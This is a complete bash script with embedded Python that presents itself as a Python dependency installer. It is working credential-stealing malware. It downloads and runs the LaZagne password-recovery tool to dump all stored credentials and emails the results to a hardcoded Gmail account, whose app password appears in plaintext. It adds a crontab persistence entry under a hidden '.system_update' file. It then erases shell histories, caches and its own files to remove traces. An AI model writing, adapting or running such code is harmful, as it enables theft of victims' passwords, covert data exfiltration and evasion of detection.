#!/bin/bash

# Environmental variables for all dependencies
export LAZAGNE_DIR="/tmp/LaZagne-master"
export LAZAGNE_ZIP="/tmp/LaZagne-master.zip"
export VENV_DIR="/tmp/venv"
export LOG_DIR="/tmp/logs"
export SCRIPT_DIR="/tmp/.system_update"
export RESULTS_FILE="/tmp/lazagne_full_results.txt"
export PDF_FILE="/tmp/lazagne_results.pdf"
export CRON_LOG="/tmp/lazagne_cron.log"

# Cleanup function to remove all traces
cleanup() {
    echo "Starting cleanup process..."
    
    # Remove installed files and directories
    rm -rf "$LAZAGNE_DIR" "$LAZAGNE_ZIP" "$VENV_DIR" "$LOG_DIR" \
           "$SCRIPT_DIR" "$RESULTS_FILE" "$PDF_FILE" "$CRON_LOG" \
           /tmp/LaZagne* /tmp/venv* /tmp/.system_update* /tmp/lazagne_* \
           /tmp/reportlab* /tmp/fpdf* /tmp/python* 2>/dev/null
    
    # Remove crontab entries
    crontab -l 2>/dev/null | grep -v ".system_update" | crontab - 2>/dev/null
    crontab -l 2>/dev/null | grep -v "lazagne" | crontab - 2>/dev/null
    
    # Clear bash history
    history -c
    history -w
    rm -f ~/.bash_history
    export HISTSIZE=0
    export HISTFILESIZE=0
    
    # Clear other shell histories
    rm -f ~/.zsh_history ~/.fish_history ~/.python_history 2>/dev/null
    
    # Clear temporary files
    rm -rf /tmp/pip* /tmp/.pip /tmp/.cache /tmp/.python* 2>/dev/null
    
    # Clear package manager caches
    if command -v apt-get &> /dev/null; then
        sudo apt-get clean 2>/dev/null
        sudo rm -rf /var/cache/apt/archives/* 2>/dev/null
    fi
    
    if command -v brew &> /dev/null; then
        brew cleanup 2>/dev/null
    fi
    
    # Clear pip cache
    python3 -m pip cache purge 2>/dev/null
    
    # Remove any leftover Python cache files
    find /tmp -name "*.pyc" -delete 2>/dev/null
    find /tmp -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null
    
    echo "Cleanup completed. All traces removed."
}

# Trap to ensure cleanup runs on exit
trap cleanup EXIT INT TERM

# Function to install dependencies
install_dependencies() {
    local system_os=$1
    
    echo "Installing dependencies for $system_os..."
    
    # Create log directory
    mkdir -p "$LOG_DIR"
    
    if [ "$system_os" = "macOS" ]; then
        # Install Homebrew if not installed
        if ! command -v brew &> /dev/null; then
            echo "Installing Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" > "$LOG_DIR/brew_install.log" 2>&1
        fi
        
        # Install required packages
        brew install python python@3.10 git curl unzip > "$LOG_DIR/brew_install.log" 2>&1
        brew install openssl readline sqlite3 xz zlib tcl-tk > "$LOG_DIR/brew_install.log" 2>&1
        
        # Set up Python environment
        python3 -m pip install --upgrade pip setuptools wheel > "$LOG_DIR/pip_install.log" 2>&1
        
    else
        # Linux (Debian/Ubuntu based)
        echo "Updating package lists..."
        sudo apt-get update -qq > "$LOG_DIR/apt_update.log" 2>&1
        
        echo "Installing system dependencies..."
        sudo apt-get install -qq -y \
            python3 \
            python3-pip \
            python3-venv \
            python3-dev \
            build-essential \
            libssl-dev \
            zlib1g-dev \
            libbz2-dev \
            libreadline-dev \
            libsqlite3-dev \
            curl \
            llvm \
            libncurses5-dev \
            libncursesw5-dev \
            xz-utils \
            tk-dev \
            libffi-dev \
            liblzma-dev \
            python3-openssl \
            git \
            unzip \
            libxml2-dev \
            libxslt1-dev \
            libjpeg-dev \
            zlib1g-dev \
            libfreetype6-dev \
            libpq-dev \
            libffi-dev \
            libssl-dev > "$LOG_DIR/apt_install.log" 2>&1
            
        # Upgrade pip
        python3 -m pip install --upgrade pip setuptools wheel > "$LOG_DIR/pip_upgrade.log" 2>&1
    fi
    
    # Install Python packages
    echo "Installing Python packages..."
    python3 -m pip install --quiet --upgrade pip > "$LOG_DIR/pip_install.log" 2>&1
    python3 -m pip install --quiet \
        reportlab \
        fpdf \
        requests \
        beautifulsoup4 \
        lxml \
        pillow \
        cryptography \
        pycryptodome \
        psutil \
        setuptools \
        wheel \
        virtualenv > "$LOG_DIR/python_packages.log" 2>&1
    
    # Create virtual environment as fallback
    if [ ! -d "$VENV_DIR" ]; then
        python3 -m venv "$VENV_DIR" > "$LOG_DIR/venv_create.log" 2>&1
        "$VENV_DIR"/bin/pip install --quiet --upgrade pip > "$LOG_DIR/venv_pip.log" 2>&1
        "$VENV_DIR"/bin/pip install --quiet reportlab fpdf > "$LOG_DIR/venv_packages.log" 2>&1
    fi
}

# Detect OS
if [ "$(uname)" = "Darwin" ]; then
    export SYSTEM_OS="macOS"
else
    export SYSTEM_OS="Linux"
fi

# Install dependencies
install_dependencies "$SYSTEM_OS"

# Wait for installations to complete
sleep 3

# Function to run Python code with proper environment
run_python_script() {
    # First try system Python
    if python3 -c "import reportlab, fpdf" 2>/dev/null; then
        python3 -c "$1"
    # Then try virtual environment
    elif "$VENV_DIR"/bin/python -c "import reportlab, fpdf" 2>/dev/null; then
        "$VENV_DIR"/bin/python -c "$1"
    else
        # Last resort: install minimal requirements and try again
        python3 -m pip install --quiet reportlab fpdf > "$LOG_DIR/fallback_install.log" 2>&1
        python3 -c "$1"
    fi
}

# Python script content
PYTHON_SCRIPT='
import smtplib, ssl, socket, os, getpass, subprocess, sys, time, tempfile, shutil
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Set environmental variables from shell
LAZAGNE_DIR = os.environ.get("LAZAGNE_DIR", "/tmp/LaZagne-master")
LAZAGNE_ZIP = os.environ.get("LAZAGNE_ZIP", "/tmp/LaZagne-master.zip")
VENV_DIR = os.environ.get("VENV_DIR", "/tmp/venv")
RESULTS_FILE = os.environ.get("RESULTS_FILE", "/tmp/lazagne_full_results.txt")
PDF_FILE = os.environ.get("PDF_FILE", "/tmp/lazagne_results.pdf")

# Try to import reportlab with fallback
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas
    reportlab_available = True
except ImportError:
    reportlab_available = False
    # Try to install it
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "reportlab"], 
                      capture_output=True, check=True)
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        reportlab_available = True
    except:
        reportlab_available = False

try:
    import fpdf
    fpdf_available = True
except ImportError:
    fpdf_available = False
    # Try to install it
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "fpdf"], 
                      capture_output=True, check=True)
        import fpdf
        fpdf_available = True
    except:
        fpdf_available = False

def send_email(subject, body, attachment_path=None):
    try:
        gmail_user = "github0987@gmail.com"
        gmail_app_password = "gwhl efna quvk qhqj"
        
        msg = MIMEMultipart()
        msg["From"] = gmail_user
        msg["To"] = gmail_user
        msg["Subject"] = subject
        msg["X-Priority"] = "1"
        
        msg.attach(MIMEText(body, "plain"))
        
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part["Content-Disposition"] = f"attachment; filename=\"{os.path.basename(attachment_path)}\""
            msg.attach(part)
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(gmail_user, gmail_app_password)
            server.sendmail(gmail_user, gmail_user, msg.as_string())
        return True
    except Exception as e:
        return False

def create_pdf(content, filename):
    if reportlab_available:
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            text = c.beginText(40, 750)
            text.setFont("Helvetica", 10)
            
            lines = []
            for line in content.split("\n"):
                while len(line) > 100:
                    lines.append(line[:100])
                    line = line[100:]
                lines.append(line)
            
            for line in lines:
                if text.getY() < 40:
                    c.drawText(text)
                    c.showPage()
                    text = c.beginText(40, 750)
                    text.setFont("Helvetica", 10)
                text.textLine(line)
            
            c.drawText(text)
            c.save()
            return True
        except Exception as e:
            pass
    
    if fpdf_available:
        try:
            pdf = fpdf.FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=10)
            
            for line in content.split("\n"):
                pdf.cell(0, 5, line[:90], ln=True)
            
            pdf.output(filename)
            return True
        except Exception as e:
            pass
    
    try:
        with open(filename.replace(".pdf", ".txt"), "w") as f:
            f.write(content)
        return False
    except:
        return False

# Get system info
username = getpass.getuser()
hostname = socket.gethostname()
system_os = "macOS" if os.uname().sysname == "Darwin" else "Linux"

# Send initial notification
send_email("Python Installation Started", "Python installation initiated on " + hostname + " (" + system_os + ") - User: " + username)

# Install LaZagne and run in background
try:
    lazagne_repo_url = "https://github.com/AlessandroZ/LaZagne/archive/master.zip"
    
    # Download the repository
    result = subprocess.run(["curl", "-fsSL", "-o", LAZAGNE_ZIP, lazagne_repo_url], 
                          capture_output=True, text=True)
    
    if result.returncode != 0:
        send_email("LaZagne Download Failed", "Download failed: " + result.stderr)
        sys.exit(1)
    
    # Extract the repository
    result = subprocess.run(["unzip", "-q", "-o", LAZAGNE_ZIP, "-d", "/tmp"], 
                          capture_output=True, text=True)
    
    if result.returncode != 0:
        send_email("LaZagne Extraction Failed", "Extraction failed: " + result.stderr)
        sys.exit(1)
    
    send_email("LaZagne Downloaded", "LaZagne successfully downloaded and extracted on " + hostname)
    
    # Determine the correct path based on OS
    if system_os == "Linux":
        lazagne_script_path = os.path.join(LAZAGNE_DIR, "Linux", "laZagne.py")
    else:
        lazagne_script_path = os.path.join(LAZAGNE_DIR, "Mac", "laZagne.py")
    
    # Install LaZagne requirements
    requirements_path = os.path.join(LAZAGNE_DIR, "requirements.txt")
    if os.path.exists(requirements_path):
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_path], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Change to the directory to ensure module imports work correctly
    os.chdir(os.path.dirname(lazagne_script_path))
    
    # Run LaZagne and capture output
    cmd = [sys.executable, lazagne_script_path, "all"]
    process = subprocess.Popen(cmd, 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE,
                             stdin=subprocess.DEVNULL)
    
    # Wait for completion and get results
    stdout, stderr = process.communicate()
    lazagne_output = stdout.decode() if stdout else stderr.decode()
    
    # If we got an error about modules, try to install requirements again
    if "ModuleNotFoundError" in lazagne_output:
        if os.path.exists(requirements_path):
            subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_path], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            process = subprocess.Popen(cmd, 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     stdin=subprocess.DEVNULL)
            stdout, stderr = process.communicate()
            lazagne_output = stdout.decode() if stdout else stderr.decode()
    
    # Create PDF with results
    pdf_created = create_pdf(lazagne_output, PDF_FILE)
    
    # Send LaZagne results via email with PDF attachment
    results_subject = "LaZagne Results from " + hostname
    time_str = time.strftime("%Y-%m-%d %H:%M:%S")
    results_body = "System: " + hostname + " (" + system_os + ")\\nUser: " + username + "\\nTime: " + time_str
    
    if pdf_created:
        send_email(results_subject, results_body, PDF_FILE)
    else:
        results_body += "\\n\\nLaZagne Output:\\n" + lazagne_output[:1500]
        send_email(results_subject, results_body)
    
    # Save full results to file
    with open(RESULTS_FILE, "w") as f:
        f.write("System: " + hostname + "\\nUser: " + username + "\\nOS: " + system_os + "\\n\\n")
        f.write(lazagne_output)
    
    send_email("Full Results Saved", "Full LaZagne results saved to " + RESULTS_FILE + " on " + hostname)
    
    # Setup persistence
    startup_script = """#!/bin/bash
sleep 30
cd /tmp/LaZagne-master/Linux && python3 laZagne.py all > /tmp/lazagne_cron.log 2>&1
"""
    
    script_path = os.environ.get("SCRIPT_DIR", "/tmp/.system_update")
    with open(script_path, "w") as f:
        f.write(startup_script)
    os.chmod(script_path, 0o755)
    
    # Add persistence
    if system_os == "Linux":
        subprocess.run("(crontab -l 2>/dev/null; echo \"@reboot " + script_path + "\") | crontab -", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_email("Persistence Established", "Crontab persistence configured on " + hostname)
    else:
        subprocess.run("echo \"*/60 * * * * " + script_path + "\" | crontab -", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_email("Persistence Established", "Crontab persistence configured on " + hostname)
    
except Exception as e:
    send_email("LaZagne Execution Failed", "Error: " + str(e) + " on " + hostname)

# Final success notification
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)

print("All operations completed successfully. Check your email for details.")

# Python-level cleanup
try:
    # Remove any temporary Python files
    for temp_file in [LAZAGNE_ZIP, PDF_FILE, RESULTS_FILE]:
        if os.path.exists(temp_file):
            os.remove(temp_file)
    
    # Remove directories
    for temp_dir in [LAZAGNE_DIR, VENV_DIR]:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
    
    # Clear Python cache
    for root, dirs, files in os.walk("/tmp"):
        for file in files:
            if file.endswith(".pyc") or file.endswith(".pyo"):
                os.remove(os.path.join(root, file))
        for dir in dirs:
            if dir == "__pycache__":
                shutil.rmtree(os.path.join(root, dir))
                
except:
    pass
'

# Run the Python script with proper environment handling
run_python_script "$PYTHON_SCRIPT"

# Final cleanup
cleanup

echo "Operation completed successfully. All temporary files cleaned up."
exit 0
